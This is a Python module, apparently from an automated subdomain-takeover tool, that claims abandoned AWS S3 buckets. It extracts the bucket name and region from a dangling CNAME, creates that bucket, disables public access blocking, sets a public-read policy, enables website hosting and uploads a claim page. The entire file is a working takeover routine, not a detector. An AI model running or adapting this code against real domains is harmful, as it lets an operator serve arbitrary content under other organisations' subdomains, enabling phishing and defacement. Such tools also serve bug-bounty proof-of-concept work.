"""
app/takeover/providers/aws_s3.py

AWS S3 subdomain takeover.

Vulnerable pattern
------------------
  subdomain CNAME → <bucket-name>.s3.amazonaws.com
                 or <bucket-name>.s3-website-<region>.amazonaws.com
                 or <bucket-name>.s3-website.<region>.amazonaws.com
                 or <bucket-name>.s3.<region>.amazonaws.com
  The bucket no longer exists → we can create it with that exact name
  in the SAME region as the original (extracted from the CNAME).

Auto-takeover
-------------
  1. Extract bucket name AND region from CNAME
  2. Create the S3 bucket in that exact region
  3. Enable static website hosting
  4. Set bucket policy to public read
  5. Upload claim index.html

No AWS_REGION config needed — region is always parsed from the CNAME.

Required .env
-------------
  AWS_ACCESS_KEY_ID      — IAM key with s3:CreateBucket, s3:PutObject,
                           s3:PutBucketWebsite, s3:PutBucketPolicy
  AWS_SECRET_ACCESS_KEY  — IAM secret
"""

import asyncio
import json
import re
from typing import Optional, Tuple

from app.core.config import settings
from app.core.logging import logger
from app.takeover.subdomain_hunter.providers.base import CLAIM_HTML, TakeoverResult, TakeoverStatus

# Captures bucket name and optional region from all S3 CNAME variants:
#   bucket.s3.amazonaws.com                        → bucket, us-east-1 (default)
#   bucket.s3-website-eu-west-1.amazonaws.com      → bucket, eu-west-1
#   bucket.s3-website.eu-west-1.amazonaws.com      → bucket, eu-west-1
#   bucket.s3.eu-central-1.amazonaws.com           → bucket, eu-central-1
_S3_RE = re.compile(
    r"^([a-z0-9][a-z0-9\-\.]{1,61}[a-z0-9])\."
    r"s3(?:-website)?(?:[-\.]([a-z]{2}-[a-z]+-\d+))?\.amazonaws\.com\.?$",
    re.IGNORECASE,
)

_DEFAULT_REGION = "us-east-1"


def extract_bucket_and_region(cname: str) -> Tuple[Optional[str], str]:
    """
    Extract (bucket_name, region) from an S3 CNAME.
    Region defaults to us-east-1 if not present in the CNAME
    (bare .s3.amazonaws.com CNAMEs are always us-east-1).
    """
    cname = cname.lower().strip().rstrip(".")
    m = _S3_RE.match(cname)
    if not m:
        return None, _DEFAULT_REGION
    bucket = m.group(1)
    region = m.group(2) or _DEFAULT_REGION  # group(2) is None for bare s3.amazonaws.com
    return bucket, region


class AWSS3TakeoverChecker:

    PROVIDER = "aws_s3"

    def __init__(self) -> None:
        self._key_id: Optional[str] = getattr(settings, "AWS_ACCESS_KEY_ID", None)
        self._secret: Optional[str] = getattr(settings, "AWS_SECRET_ACCESS_KEY", None)
        self._ready = bool(self._key_id and self._secret)
        if not self._ready:
            logger.warning("AWSS3TakeoverChecker: AWS credentials not set — disabled")

    async def attempt(self, subdomain_name: str, cname: str) -> TakeoverResult:
        bucket, region = extract_bucket_and_region(cname)
        if not bucket:
            # Without a parsed bucket the checker cannot know which global
            # namespace entry to claim; creating one named after the subdomain
            # would touch an unrelated bucket.
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                evidence={"cname": cname},
                error=f"Cannot extract bucket name/region from CNAME: {cname}",
            )

        if not self._ready:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                evidence={"s3_bucket": bucket, "s3_region": region},
                error="AWS credentials not configured",
            )

        logger.info(
            "aws_s3 takeover: attempting bucket=%s region=%s for %s",
            bucket, region, subdomain_name,
        )

        try:
            import aioboto3  # optional dep — only needed if AWS configured
        except ImportError:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                evidence={"s3_bucket": bucket, "s3_region": region},
                error="aioboto3 not installed — run: pip install aioboto3",
            )

        try:
            return await self._run(aioboto3, subdomain_name, bucket, region)
        except asyncio.TimeoutError:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error="Timeout",
            )
        except Exception as exc:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=self.PROVIDER,
                subdomain=subdomain_name,
                error=str(exc),
            )

    async def _run(self, aioboto3, subdomain: str, bucket: str, region: str) -> TakeoverResult:
        evidence = {"s3_bucket": bucket, "s3_region": region}

        session = aioboto3.Session(
            aws_access_key_id=self._key_id,
            aws_secret_access_key=self._secret,
            region_name=region,
        )

        async with session.client("s3") as s3:
            # 1 — Create bucket
            try:
                if region == "us-east-1":
                    await s3.create_bucket(Bucket=bucket)
                else:
                    await s3.create_bucket(
                        Bucket=bucket,
                        CreateBucketConfiguration={"LocationConstraint": region},
                    )
            except s3.exceptions.BucketAlreadyExists:
                return TakeoverResult(
                    status=TakeoverStatus.NOT_VULN,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    confidence_delta=-30,
                    evidence=evidence,
                    error="Bucket name already exists globally",
                )
            except s3.exceptions.BucketAlreadyOwnedByYou:
                pass  # we own it — continue configuring
            except Exception as exc:
                return TakeoverResult(
                    status=TakeoverStatus.FAIL,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    evidence=evidence,
                    error=f"CreateBucket: {exc}",
                )

            # 2 — Disable block public access
            try:
                await s3.put_public_access_block(
                    Bucket=bucket,
                    PublicAccessBlockConfiguration={
                        "BlockPublicAcls":       False,
                        "IgnorePublicAcls":      False,
                        "BlockPublicPolicy":     False,
                        "RestrictPublicBuckets": False,
                    },
                )
            except Exception as exc:
                logger.warning("aws_s3: put_public_access_block failed: %s", exc)

            # 3 — Bucket policy: public read
            policy = json.dumps({
                "Version": "2012-10-17",
                "Statement": [{
                    "Sid":       "PublicReadGetObject",
                    "Effect":    "Allow",
                    "Principal": "*",
                    "Action":    "s3:GetObject",
                    "Resource":  f"arn:aws:s3:::{bucket}/*",
                }],
            })
            try:
                await s3.put_bucket_policy(Bucket=bucket, Policy=policy)
            except Exception as exc:
                logger.warning("aws_s3: put_bucket_policy failed: %s", exc)

            # 4 — Enable static website hosting
            try:
                await s3.put_bucket_website(
                    Bucket=bucket,
                    WebsiteConfiguration={
                        "IndexDocument": {"Suffix": "index.html"},
                        "ErrorDocument": {"Key":    "index.html"},
                    },
                )
            except Exception as exc:
                logger.warning("aws_s3: put_bucket_website failed: %s", exc)

            # 5 — Upload claim HTML
            try:
                await s3.put_object(
                    Bucket=bucket,
                    Key="index.html",
                    Body=CLAIM_HTML.encode(),
                    ContentType="text/html",
                )
            except Exception as exc:
                return TakeoverResult(
                    status=TakeoverStatus.FAIL,
                    provider=self.PROVIDER,
                    subdomain=subdomain,
                    evidence={**evidence, "bucket_created": True},
                    error=f"Upload failed: {exc}",
                )

        # Website endpoint format varies by region style
        if region == "us-east-1":
            claim_url = f"http://{bucket}.s3-website-us-east-1.amazonaws.com"
        else:
            claim_url = f"http://{bucket}.s3-website.{region}.amazonaws.com"

        logger.info("aws_s3 takeover: SUCCESS bucket=%s region=%s", bucket, region)
        return TakeoverResult(
            status=TakeoverStatus.SUCCESS,
            provider=self.PROVIDER,
            subdomain=subdomain,
            confidence_delta=+10,
            evidence={**evidence, "bucket_created": True},
            claim_url=claim_url,
        )